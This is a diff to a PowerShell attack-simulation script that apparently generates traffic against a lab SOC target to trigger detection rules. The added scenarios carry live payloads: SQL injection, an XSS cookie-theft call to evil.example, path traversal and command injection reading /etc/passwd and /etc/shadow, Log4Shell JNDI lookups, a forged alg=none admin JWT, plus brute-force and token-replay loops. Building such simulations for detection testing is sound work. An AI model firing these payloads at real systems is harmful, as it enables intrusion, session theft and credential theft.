@@ -4,7 +4,9 @@
 #   powershell -ExecutionPolicy Bypass -File scripts\simulate-attacks.ps1            # every scenario
 #   powershell -ExecutionPolicy Bypass -File scripts\simulate-attacks.ps1 bruteforce # one scenario
 #
-# Scenarios: baseline bruteforce spray privesc idor tokens flood
+# Basic scenarios:    baseline bruteforce spray privesc idor tokens flood
+# Advanced scenarios: takeover distributed hijack injection log4shell recon scanner scraping algnone
+# Groups:             basic, advanced (default: everything)
 # Only run this against your own lab environment.
 param([string[]]$Scenarios)
 
@@ -31,8 +33,9 @@ $client = [System.Net.Http.HttpClient]::new()
 
 function New-Request([string]$method, [string]$path, [string]$token, [string]$ip, [string]$json) {
     $req = [System.Net.Http.HttpRequestMessage]::new([System.Net.Http.HttpMethod]::new($method), "$target$path")
-    $req.Headers.Add('X-Forwarded-For', $ip)
-    if ($token) { $req.Headers.Add('Authorization', "Bearer $token") }
+    # TryAddWithoutValidation: attack payloads (e.g. a JNDI string as User-Agent) are not valid header syntax.
+    [void]$req.Headers.TryAddWithoutValidation('X-Forwarded-For', $ip)
+    if ($token) { [void]$req.Headers.TryAddWithoutValidation('Authorization', "Bearer $token") }
     if ($json) { $req.Content = [System.Net.Http.StringContent]::new($json, [System.Text.Encoding]::UTF8, 'application/json') }
     return $req
 }
@@ -120,11 +123,119 @@ function flood {
     Write-Host ''
 }
 
+# --- advanced scenarios -----------------------------------------------------------
+# GET with a custom User-Agent, optional URL-encoded query parameters and extra headers.
+function Invoke-Probe([string]$ip, [string]$userAgent, [string]$path, [hashtable]$query, [hashtable]$headers) {
+    $url = $path
+    if ($query) {
+        $pairs = foreach ($k in $query.Keys) { "$k=$([Uri]::EscapeDataString([string]$query[$k]))" }
+        $url = "${path}?$($pairs -join '&')"
+    }
+    $req = New-Request 'GET' $url $null $ip $null
+    [void]$req.Headers.TryAddWithoutValidation('User-Agent', $userAgent)
+    if ($headers) { foreach ($k in $headers.Keys) { [void]$req.Headers.TryAddWithoutValidation($k, [string]$headers[$k]) } }
+    return [int]$client.SendAsync($req).GetAwaiter().GetResult().StatusCode
+}
+
+function takeover {
+    Say "Account takeover: 6 failed logins for 'bob' then a SUCCESS from 45.155.205.233 (rule ACCOUNT_TAKEOVER)"
+    $ip = '45.155.205.233'
+    $codes = foreach ($i in 1..6) { Get-LoginStatus 'bob' "Winter202$i!" $ip }
+    $codes += Get-LoginStatus 'bob' $bobPw $ip
+    $t = Get-Token 'bob' $bobPw $ip
+    $codes += Invoke-Call 'GET' '/api/orders' $t $ip
+    Write-Host ($codes -join ' ')
+}
+
+function distributed {
+    Say "Distributed brute force: 'admin' attacked from 6 botnet IPs, 1 attempt each (rule DISTRIBUTED_BRUTE_FORCE)"
+    $codes = foreach ($n in 10..15) { Get-LoginStatus 'admin' "P@ssw0rd$n" "5.188.62.$n" }
+    Write-Host ($codes -join ' ')
+}
+
+function hijack {
+    Say "Session hijack: alice's JWT stolen and replayed from 4 foreign IPs (rule SESSION_HIJACK)"
+    $t = Get-Token 'alice' $alicePw '10.0.0.30'
+    $codes = @(Invoke-Call 'GET' '/api/orders' $t '10.0.0.30')
+    foreach ($ip in '185.220.101.4', '103.75.190.11', '91.240.118.172', '45.95.147.236') {
+        $codes += Invoke-Call 'GET' '/api/orders' $t $ip
+        $codes += Invoke-Call 'GET' '/api/users/me' $t $ip
+    }
+    Write-Host ($codes -join ' ')
+}
+
+function injection {
+    Say 'Injection: SQLi / XSS / path traversal / command injection payloads from 103.145.13.7 (rule INJECTION_ATTEMPT)'
+    $ip = '103.145.13.7'
+    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+    $codes = @(
+        Invoke-Probe $ip $ua '/api/orders' @{ id = "1' OR '1'='1" }
+        Invoke-Probe $ip $ua '/api/orders' @{ q = '1 UNION SELECT username, password FROM users--' }
+        Invoke-Probe $ip $ua '/api/orders' @{ id = '1; SELECT pg_sleep(5)' }
+        Invoke-Probe $ip $ua '/api/users' @{ name = "<script>document.location='http://evil.example/?c='+document.cookie</script>" }
+        Invoke-Probe $ip $ua '/api/orders' @{ file = '../../../../etc/passwd' }
+        Invoke-Probe $ip $ua '/api/orders' @{ host = '127.0.0.1; cat /etc/shadow' }
+    )
+    Write-Host ($codes -join ' ')
+}
+
+function log4shell {
+    Say 'Log4Shell: ${jndi:ldap://...} lookup in headers from 45.83.64.1 (rule LOG4SHELL_EXPLOIT)'
+    $ip = '45.83.64.1'
+    $codes = @(
+        Invoke-Probe $ip '${jndi:ldap://45.83.64.1:1389/Exploit}' '/api/orders'
+        Invoke-Probe $ip 'Mozilla/5.0' '/api/orders' $null @{ 'X-Api-Version' = '${${lower:j}ndi:ldap://45.83.64.1:1389/a}' }
+    )
+    Write-Host ($codes -join ' ')
+}
+
+function recon {
+    Say 'Recon: directory/endpoint discovery of 12 well-known paths from 162.142.125.9 (rule RECON_PATH_SCAN)'
+    $paths = '/.env', '/.git/config', '/wp-admin/', '/wp-login.php', '/phpmyadmin/', '/admin', '/server-status',
+             '/backup.zip', '/config.json', '/api/v1/users', '/swagger-ui.html', '/console'
+    $codes = foreach ($p in $paths) { Invoke-Probe '162.142.125.9' 'Mozilla/5.0 (compatible; Recon/1.0)' $p }
+    Write-Host ($codes -join ' ')
+}
+
+function scanner {
+    Say 'Scanner: sqlmap and nuclei user agents from 194.26.29.110 (rule SCANNER_TOOL)'
+    $ip = '194.26.29.110'
+    $codes = foreach ($i in 1..3) {
+        Invoke-Probe $ip 'sqlmap/1.8.4#stable (https://sqlmap.org)' '/api/orders' @{ id = "$i" }
+        Invoke-Probe $ip 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))' "/api/orders/$i"
+    }
+    Write-Host ($codes -join ' ')
+}
+
+function scraping {
+    Say "Data scraping: 'alice' reads her orders 45 times in a few seconds (rule DATA_SCRAPING)"
+    $t = Get-Token 'alice' $alicePw '10.0.0.13'
+    foreach ($i in 1..45) {
+        [void](Invoke-Call 'GET' "/api/orders/$(1001 + ($i % 2))" $t '10.0.0.13')
+        if ($i % 15 -eq 0) { Write-Host -NoNewline "$i " }
+    }
+    Write-Host ''
+}
+
+function algnone {
+    Say 'JWT forgery: unsigned alg=none token claiming ROLE_ADMIN from 192.0.2.77 (rule JWT_ALG_NONE)'
+    # {"alg":"none"}.{"iss":"mini-soc-target-app","sub":"admin","roles":["ROLE_USER","ROLE_ADMIN"],"jti":"forged-alg-none"}.
+    $none = 'eyJhbGciOiJub25lIn0.eyJpc3MiOiJtaW5pLXNvYy10YXJnZXQtYXBwIiwic3ViIjoiYWRtaW4iLCJyb2xlcyI6WyJST0xFX1VTRVIiLCJST0xFX0FETUlOIl0sImp0aSI6ImZvcmdlZC1hbGctbm9uZSJ9.'
+    $codes = @((Invoke-Call 'GET' '/api/admin/stats' $none '192.0.2.77'), (Invoke-Call 'GET' '/api/users' $none '192.0.2.77'))
+    Write-Host ($codes -join ' ')
+}
+
 # --- main ------------------------------------------------------------------------
-$all = 'baseline', 'bruteforce', 'spray', 'privesc', 'idor', 'tokens', 'flood'
-if (-not $Scenarios -or $Scenarios.Count -eq 0) { $Scenarios = $all }
+$basic = 'baseline', 'bruteforce', 'spray', 'privesc', 'idor', 'tokens', 'flood'
+$advanced = 'takeover', 'distributed', 'hijack', 'injection', 'log4shell', 'recon', 'scanner', 'scraping', 'algnone'
+$all = $basic + $advanced
+$expanded = foreach ($s in $Scenarios) {
+    if ($s -eq 'basic') { $basic } elseif ($s -eq 'advanced') { $advanced } else { $s }
+}
+$Scenarios = @($expanded)
+if ($Scenarios.Count -eq 0) { $Scenarios = $all }
 foreach ($s in $Scenarios) {
-    if ($all -notcontains $s) { throw "Unknown scenario: $s (valid: $($all -join ', '))" }
+    if ($all -notcontains $s) { throw "Unknown scenario: $s (valid: basic, advanced, $($all -join ', '))" }
     & $s
 }
 
